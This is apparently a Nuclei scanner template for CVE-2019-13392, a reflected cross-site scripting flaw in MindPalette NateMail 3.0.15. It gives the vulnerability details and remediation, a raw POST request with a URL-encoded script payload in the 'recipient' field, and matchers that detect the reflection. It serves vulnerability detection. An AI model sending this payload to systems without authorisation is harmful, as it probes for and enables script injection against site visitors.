id: CVE-2019-13392

info:
  name: MindPalette NateMail 3.0.15 - Cross-Site Scripting
  author: pikpikcu
  severity: medium
  description: MindPalette NateMail 3.0.15 is susceptible to reflected cross-site scripting which could allows an attacker to execute remote JavaScript in a victim's browser via a specially crafted POST request. The application will reflect the recipient value if it is not in the NateMail recipient array. Note that this array is keyed via integers by default, so any string input will be invalid.
  remediation: |
    Upgrade to the latest version of MindPalette NateMail to fix the XSS vulnerability.
  reference:
    - https://www.doyler.net/security-not-included/natemail-vulnerabilities
    - https://mindpalette.com/tag/natemail/
    - https://nvd.nist.gov/vuln/detail/CVE-2019-13392
    - https://twitter.com/mindpalette
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2019-13392
    cwe-id: CWE-79
    epss-score: 0.0014
    epss-percentile: 0.49467
    cpe: cpe:2.3:a:mindpalette:natemail:3.0.15:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: mindpalette
    product: natemail
  tags: cve,cve2019,natemail,xss

http:
  - raw:
      - |
        POST /NateMail.php HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Content-Type: application/x-www-form-urlencoded

        recipient=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '</script><script>alert(document.domain)</script>'

      - type: word
        part: header
        words:
          - text/html
# digest: 4b0a00483046022100af517222f0812f5c7594741b6346a7c6b6e43a3222b43c99141fe005f1182d11022100b1a08d29e47a49f6bbcefd302a18b342ea11e641a3584da032e960a74fbdeb06:922c64590222798bb761d5b6d8e72950